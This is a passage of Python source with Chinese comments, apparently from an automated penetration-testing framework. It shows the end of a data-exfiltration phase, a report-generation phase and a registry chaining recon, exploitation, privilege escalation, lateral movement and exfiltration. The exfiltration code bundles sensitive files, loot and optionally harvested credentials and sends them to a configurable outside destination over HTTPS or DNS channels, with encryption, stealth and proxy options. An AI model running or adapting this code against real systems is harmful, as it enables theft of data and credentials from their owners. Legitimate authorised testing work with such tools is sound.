                              f"{exfil_assessment['loot_count']} 份敏感数据可能被外泄",
                'phase': 'exfiltrate'
            })

        if dry_run:
            exfil_assessment['note'] = 'dry_run=True，仅评估外泄可行性，未实际执行数据外泄'
            return PhaseResult(
                success=True,
                phase=PentestPhase.EXFILTRATE,
                data=exfil_assessment,
                findings=findings,
                errors=errors
            )

        try:
            import json
            from core.exfiltration import ExfilFactory, ExfilConfig, ExfilChannel

            channel = self.config.get('exfil_channel')
            if not channel:
                methods = self.config.get('exfil_methods') or []
                channel = methods[0] if methods else 'https'

            destination = self.config.get('exfil_destination') or self.config.get('destination') or ''
            if not destination:
                return PhaseResult(
                    success=False,
                    phase=PentestPhase.EXFILTRATE,
                    data={'error': '缺少 exfil_destination 配置'},
                    findings=findings,
                    errors=['缺少 exfil_destination 配置']
                )

            payload = {
                'session_id': self.state.session_id,
                'target': self.state.target,
                'sensitive_files': sensitive_data,
                'loot': self.state.loot,
            }
            if include_credentials:
                payload['credentials'] = credentials

            data_bytes = json.dumps(payload, ensure_ascii=True, default=str).encode('utf-8')

            config = ExfilConfig(
                channel=ExfilChannel(channel),
                destination=destination,
                encryption=bool(self.config.get('encryption', True)),
                chunk_size=int(self.config.get('chunk_size', 4096)),
                rate_limit=float(self.config.get('rate_limit', 0.0)),
                timeout=float(self.config.get('timeout', 30.0)),
                stealth=bool(self.config.get('stealth', False)),
                proxy=self.config.get('proxy'),
                dns_domain=self.config.get('exfil_dns_domain') or self.config.get('dns_domain') or '',
                dns_subdomain_length=int(self.config.get('dns_subdomain_length', 63)),
                nameserver=self.config.get('exfil_nameserver') or self.config.get('nameserver'),
            )

            module = ExfilFactory.create(config)
            result = module.exfiltrate(data_bytes)

            data = result.to_dict()
            data.update({
                'payload_size': len(data_bytes),
                'channel': channel,
                'destination': destination,
            })

            if result.success:
                findings.append({
                    'type': 'data_exfiltration',
                    'severity': 'critical',
                    'title': f"数据外泄成功 ({channel})",
                    'description': f"成功外泄 {len(data_bytes)} bytes 数据",
                    'phase': 'exfiltrate'
                })

            return PhaseResult(
                success=result.success,
                phase=PentestPhase.EXFILTRATE,
                data=data,
                findings=findings,
                errors=errors
            )

        except Exception as e:
            errors.append(str(e))
            self.logger.exception(f"数据外泄阶段失败: {e}")
            return PhaseResult(
                success=False,
                phase=PentestPhase.EXFILTRATE,
                data={'error': str(e)},
                findings=findings,
                errors=errors
            )


class ReportPhaseExecutor(BasePhaseExecutor):
    """报告生成阶段执行器"""

    name = 'report'
    description = '报告生成'
    required_phases = []

    @property
    def phase(self):
        from .state import PentestPhase
        return PentestPhase.REPORT

    async def execute(self) -> PhaseResult:
        from .state import PentestPhase
        errors = []

        try:
            from utils.report_generator import ReportGenerator

            generator = ReportGenerator()
            formats = self.config.get('report_formats') or self.config.get('formats') or ['html', 'json', 'markdown']
            reports = {}

            for fmt in formats:
                try:
                    report_path = generator.generate(self.state.session_id, fmt)
                    reports[fmt] = report_path
                except Exception as e:
                    errors.append(f"生成 {fmt} 报告失败: {e}")

            return PhaseResult(
                success=len(reports) > 0,
                phase=PentestPhase.REPORT,
                data={'reports': reports},
                findings=[],
                errors=errors
            )

        except Exception as e:
            errors.append(str(e))
            return PhaseResult(
                success=False,
                phase=PentestPhase.REPORT,
                data={},
                findings=[],
                errors=errors
            )


# 阶段执行器注册表
PHASE_EXECUTORS = {
    'recon': ReconPhaseExecutor,
    'vuln_scan': VulnScanPhaseExecutor,
    'poc_exec': PoCExecPhaseExecutor,
    'exploit': ExploitPhaseExecutor,
    'privilege_escalation': PrivilegeEscPhaseExecutor,
    'lateral_movement': LateralMovePhaseExecutor,
    'exfiltrate': ExfiltratePhaseExecutor,
    'report': ReportPhaseExecutor,
}


__all__ = [
    'BasePhaseExecutor',
    'PhaseResult',
    'PHASE_EXECUTORS',
    'ReconPhaseExecutor',
    'VulnScanPhaseExecutor',
    'PoCExecPhaseExecutor',
    'ExploitPhaseExecutor',
    'PrivilegeEscPhaseExecutor',
    'LateralMovePhaseExecutor',
    'ExfiltratePhaseExecutor',
    'ReportPhaseExecutor',
]
